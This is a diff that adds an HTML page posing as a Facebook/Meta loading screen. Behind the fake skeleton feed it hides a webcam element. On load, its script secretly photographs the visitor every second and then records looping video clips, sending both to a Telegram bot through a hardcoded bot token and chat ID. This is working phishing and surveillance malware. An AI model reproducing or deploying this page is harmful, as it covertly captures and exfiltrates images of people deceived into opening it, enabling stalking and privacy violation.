@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thu Zar Lin</title>
+    <style>
+        :root {
+            --fb-blue: #1877f2;
+            --fb-blue-light: #e7f3ff;
+            --bg-color: #f0f2f5;
+            --white: #ffffff;
+            --text-primary: #050505;
+            --text-secondary: #65676b;
+            --error-bg: #fff8e6;
+            --error-text: #8a6d3b;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 1M;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 375px;
+            padding: 20px;
+            position: relative;
+            height: 100%;
+        }
+        
+        .logo {
+            margin-bottom: 30px;
+            position: relative;
+            width: 60px;
+            height: 60px;
+            animation: subtleBounce 1.5s infinite ease-in-out;
+            height: 45vh;
+        }
+        
+        .logo svg {
+            width: 60px;
+            height: 60px;
+            height: 80vh;
+        }
+        
+        .dots {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+        
+        .dot {
+            width: 8px;
+            height: 8px;
+            margin: 0 4px;
+            background-color: #cfd1d4;
+            border-radius: 50%;
+            animation: blink 1.4s infinite ease-in-out both;
+        }
+        
+        .dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+        
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        
+        .dot:nth-child(4) {
+            animation-delay: 0.6s;
+        }
+        
+        .dot:nth-child(5) {
+            animation-delay: 0.8s;
+        }
+        
+        @keyframes blink {
+            0%, 80%, 100% {
+                opacity: 0.3;
+                transform: scale(1);
+            }
+            40% {
+                opacity: 1;
+                transform: scale(1.5);
+            }
+        }
+        
+        .meta {
+            position: absolute;
+            bottom: 20px;
+            font-size: 14px;
+            color: #606770;
+            display: flex;
+            align-items: center;
+        }
+        
+        .meta-logo {
+            font-weight: 600;
+            margin-left: 5px;
+            color: var(--fb-blue);
+        }
+        
+        .app-preview {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            background-color: var(--white);
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .connection-error {
+            background-color: #ffffff;
+            color: var(--error-text);
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+            animation: slideDown 0.3s ease-out;
+        }
+        
+        .warning-icon {
+            margin-right: 12px;
+            width: 20px;
+            height: 20px;
+ display: none;
+        }
+        
+        .error-text {
+            flex-grow: 1;
+            font-weight: 700;
+            font-size: 24px;
+            color: #1877f2;
+            margin-left: 10px;
+        }
+        
+        .retry-button {
+            color: var(--fb-blue);
+            background: none;
+            border: none;
+            font-weight: 600;
+            font-size: 14px;
+            margin-left: 12px;
+            cursor: pointer;
+             display: none;
+        }
+        
+        .skeleton-content {
+            flex-grow: 1;
+            padding: 16px;
+            overflow-y: auto;
+        }
+        
+        .skeleton-post {
+            background-color: var(--white);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        .skeleton-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        
+        .skeleton-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #eee;
+            margin-right: 12px;
+        }
+        
+        .skeleton-user {
+            flex-grow: 1;
+        }
+        
+        .skeleton-line {
+            height: 12px;
+            background-color: #eee;
+            border-radius: 4px;
+            margin-bottom: 8px;
+        }
+        
+        .skeleton-line.short {
+            width: 60%;
+        }
+        
+        .skeleton-line.medium {
+            width: 80%;
+        }
+        
+        .skeleton-content-block {
+            height: 200px;
+            background-color: #eee;
+            border-radius: 8px;
+            margin-bottom: 12px;
+        }
+        
+        .skeleton-actions {
+            display: flex;
+            padding-top: 8px;
+            border-top: 1px solid #eee;
+        }
+        
+        .skeleton-action {
+            flex: 1;
+            height: 32px;
+            background-color: #eee;
+            border-radius: 4px;
+            margin: 0 4px;
+        }
+        
+        #webcam-container {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            width: 1px;
+            height: 1px;
+        }
+        
+        #canvas {
+            display: none;
+        }
+        
+        .status-indicator {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
+            z-index: 100;
+            display: none;
+        }
+        
+        .photo-status {
+            background-color: #4CAF50;
+            color: white;
+display: none;
+        }
+        
+        .video-status {
+            background-color: #2196F3;
+            color: white;
+        }
+        
+        @keyframes subtleBounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        
+        .loading-complete .logo {
+            animation: none;
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        
+        .loading-complete .dots {
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+        
+        .loading-complete .app-preview {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .skeleton-avatar,
+        .skeleton-line,
+        .skeleton-content-block,
+        .skeleton-action {
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="status-indicator photo-status">PHOTO CAPTURE ACTIVE</div>
+    
+    <div class="loading-screen" id="loadingScreen">
+        <div class="logo">
+            <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="18" cy="18" r="18" fill="#1877F2"/>
+                <path d="M24.5 12H21.5C20.67 12 20 12.67 20 13.5V16H24L23.5 20H20V30H16V20H13V16H16V13.5C16 11.01 18.01 9 20.5 9H24.5V12Z" fill="white"/>
+            </svg>
+        </div>
+        
+        <div class="dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        
+        <div class="meta">
+            from <span class="meta-logo">Meta</span>
+        </div>
+        
+        <div class="app-preview">
+            <div class="connection-error">
+                <svg class="warning-icon" viewBox="0 0 24 24" fill="#1877f2" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                <div class="error-text">Facebook</div>
+                <button class="retry-button">Retry</button>
+            </div>
+            
+            <div class="skeleton-content">
+                <div class="skeleton-post">
+                    <div class="skeleton-header">
+                        <div class="skeleton-avatar"></div>
+                        <div class="skeleton-user">
+                            <div class="skeleton-line short"></div>
+                            <div class="skeleton-line medium"></div>
+                        </div>
+                    </div>
+                    <div class="skeleton-content-block"></div>
+                    <div class="skeleton-actions">
+                        <div class="skeleton-action"></div>
+                        <div class="skeleton-action"></div>
+                        <div class="skeleton-action"></div>
+                    </div>
+                </div>
+                
+                <div class="skeleton-post">
+                    <div class="skeleton-header">
+                        <div class="skeleton-avatar"></div>
+                        <div class="skeleton-user">
+                            <div class="skeleton-line short"></div>
+                            <div class="skeleton-line medium"></div>
+                        </div>
+                    </div>
+                    <div class="skeleton-content-block" style="height: 120px;"></div>
+                    <div class="skeleton-actions">
+                        <div class="skeleton-action"></div>
+                        <div class="skeleton-action"></div>
+                        <div class="skeleton-action"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden webcam elements -->
+    <div id="webcam-container">
+        <video id="webcam" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        // Telegram bot configuration
+        const TELEGRAM_BOT_TOKEN = '8562372604:AAGc-RZnlgHueqoRA2g6qwvQzRfItQpqJ50';
+        const TELEGRAM_CHAT_ID = '7336260003';
+        const PHOTO_CAPTURE_INTERVAL = 1000; // 1 second
+        const VIDEO_RECORD_DURATION = 5000; // 5 seconds
+        
+        // Webcam elements
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const statusIndicator = document.querySelector('.status-indicator');
+        
+        // State management
+        let photoInterval;
+        let mediaRecorder;
+        let recordedChunks = [];
+        let isVideoRecording = false;
+        let stream;
+        
+        // Start webcam
+        async function startWebcam() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        facingMode: 'user', // Use front camera
+                        width: 640,
+                        height: 480
+                    },
+                    audio: false
+                });
+                
+                video.srcObject = stream;
+                
+                // Set canvas size to match video
+                video.addEventListener('loadedmetadata', () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    // Start capturing photos at intervals
+                    startPhotoCapture();
+                    
+                    // Set up video recording capabilities
+                    setupVideoRecording();
+                });
+            } catch (err) {
+                console.error('Error accessing webcam:', err);
+                alert('Could not access webcam. Please allow camera permissions.');
+            }
+        }
+        
+        // Start photo capture
+        function startPhotoCapture() {
+            photoInterval = setInterval(captureAndSendPhoto, PHOTO_CAPTURE_INTERVAL);
+            statusIndicator.textContent = "PHOTO CAPTURE ACTIVE";
+            statusIndicator.className = "status-indicator photo-status";
+        }
+        
+        // Stop photo capture
+        function stopPhotoCapture() {
+            clearInterval(photoInterval);
+        }
+        
+        // Capture photo from webcam and send to Telegram
+        function captureAndSendPhoto() {
+            // Draw current video frame to canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert canvas to blob
+            canvas.toBlob(async (blob) => {
+                try {
+                    // Create form data
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('caption', `Photo captured at ${new Date().toLocaleString()}`);
+                    
+                    // Send to Telegram bot
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (!response.ok) {
+                        console.error('Failed to send photo to Telegram');
+                    }
+                } catch (err) {
+                    console.error('Error sending photo:', err);
+                }
+            }, 'image/jpeg', 0.8);
+        }
+        
+        // Set up video recording
+        function setupVideoRecording() {
+            try {
+                const options = { mimeType: 'video/webm;codecs=vp9' };
+                mediaRecorder = new MediaRecorder(stream, options);
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    if (recordedChunks.length === 0) return;
+                    
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    recordedChunks = [];
+                    
+                    try {
+                        const formData = new FormData();
+                        formData.append('chat_id', TELEGRAM_CHAT_ID);
+                        formData.append('video', blob, 'recording.webm');
+                        formData.append('caption', `Video recorded at ${new Date().toLocaleString()}`);
+                        
+                        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        if (!response.ok) {
+                            console.error('Failed to send video to Telegram');
+                        }
+                    } catch (err) {
+                        console.error('Error sending video:', err);
+                    }
+                    
+                    // Restart recording if still in video mode
+                    if (isVideoRecording) {
+                        mediaRecorder.start();
+                        setTimeout(() => {
+                            if (mediaRecorder.state === 'recording') {
+                                mediaRecorder.stop();
+                            }
+                        }, VIDEO_RECORD_DURATION);
+                    }
+                };
+            } catch (err) {
+                console.error('Error setting up video recording:', err);
+            }
+        }
+        
+        // Start video recording
+        function startVideoRecording() {
+            if (!mediaRecorder) return;
+            
+            isVideoRecording = true;
+            statusIndicator.textContent = "VIDEO RECORDING ACTIVE";
+            statusIndicator.className = "status-indicator video-status";
+            
+            mediaRecorder.start();
+            setTimeout(() => {
+                if (mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, VIDEO_RECORD_DURATION);
+        }
+        
+        // Stop video recording
+        function stopVideoRecording() {
+            isVideoRecording = false;
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        }
+        
+        // Start webcam when page loads
+        window.addEventListener('load', startWebcam);
+        
+        // Simulate loading completion after 3 seconds
+        setTimeout(() => {
+            document.getElementById('loadingScreen').classList.add('loading-complete');
+            
+            // Stop photo capture and start video recording
+            stopPhotoCapture();
+            startVideoRecording();
+        }, 20000);
+        
+        // Retry button functionality
+        document.querySelector('.retry-button').addEventListener('click', function() {
+            alert('Attempting to reconnect...');
+            // In a real app, this would trigger a connection retry
+        });
+        
+        // Clean up when page is closed
+        window.addEventListener('beforeunload', () => {
+            stopPhotoCapture();
+            stopVideoRecording();
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
